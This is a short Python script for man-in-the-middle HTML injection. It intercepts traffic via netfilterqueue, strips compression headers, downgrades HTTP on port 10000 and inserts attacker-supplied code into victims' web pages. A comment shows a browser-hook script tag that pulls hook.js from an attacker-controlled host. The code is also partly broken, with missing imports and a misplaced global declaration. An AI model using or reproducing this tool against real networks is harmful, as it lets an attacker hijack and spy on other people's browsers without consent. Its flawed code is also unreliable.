from scapy.all import IP
from mitm_helper_func import set_load, modify_content_length
import argparse
import re
import netfilterqueue

# hook browser: <script src="http://192.168.0.100:3000/hook.js"></script>

def process_pkt(pkt):
	scapy_pkt = IP(pkt.get_payload())
	if scapy_pkt.haslayer(Raw):
		load = scapy_pkt[Raw].load
		if scapy_pkt[TCP].dport == 10000:
			load = re.sub(r"Accept-Encoding:.*?\\r\\n", "", load)
			load = load.replace("HTTP/1.1", "HTTP/1.0")
		elif scapy_pkt[TCP].sport == 10000:
			load = scapy_pkt[Raw].load.replace("</body>", code_inject + "</body>")
			load = modify_content_length(load)

		if load != scapy_pkt[Raw].load:
			scapy_pkt = set_load(scapy_pkt, load)
			pkt.set_payload(str(scapy_pkt))

	pkt.accept()

def nfqueue_bind():
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_pkt)
	queue.run()

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-c', '--code', help='Write the html coode to inject')
	args = parser.parse_args()
	code_inject = args.code

	global code_inject

	nfqueue_bind()

if __name__ == '__main__':
	main()
